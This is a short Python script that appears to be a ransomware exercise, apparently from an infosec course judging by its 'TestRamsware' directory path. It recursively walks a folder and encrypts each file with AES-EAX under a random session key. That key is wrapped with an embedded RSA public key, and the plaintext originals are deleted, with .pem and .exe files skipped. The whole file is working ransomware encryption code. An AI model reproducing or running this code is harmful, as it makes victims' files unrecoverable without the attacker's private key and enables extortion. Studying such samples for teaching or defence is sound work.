import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from base64 import b64decode

def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file in binary('rb')
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes(groups of 8 bits)
    data = bytes(data)

    # create random session key
    session_key = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(publicKey)
    encryptedsession_key = cipher.encrypt(session_key)

    # encrypt the data with the session key
    cipher = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    [ fileName, fileExtension ] = str(dataFile).split('.')
    encryptedFile = fileName + "." + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedsession_key, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)


key64 = b'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3AEsALIf+1djaAwLWwLzj1hoAaZVqCr7Td/VP2SDAw/uTBjn7Ch8t2zDRhp/HHJvA3INTu2eQF0fHr0t6picPSKGnrAVCPTisBjZ0z12juv8V6psKmfS83vmXFyQ7R+/qzJLKbGd7n94j36s56NvnHaNGMGi6trfbnekWan6rTkk0iIGGyNmnrcqxELPwoSXANviaJoO9udqH2Eyod7qW54iEV3airpv9ls9odbCqHfXMmIh4QYUqVelnn1BkA5IpWnN8YRy/FGU4p2fK6XIwajI4cKaHeunMAZ9+7bhqMpiGIX1uuT6VPU55n31QHtbkm7vODaihVAlgMaEQcTrIwIDAQAB'

keyDER = b64decode(key64)
pubKey = RSA.importKey(keyDER)

dir = '/home/marcelo/Documents/infosec/ex2/TestRamsware/'

excludeExtension = ['.pem', '.exe'] 

for item in scanRecurse(dir):
    file_path = Path(item)
    file_type = file_path.suffix.lower()

    if file_type in excludeExtension:
        continue
    encrypt(file_path, pubKey)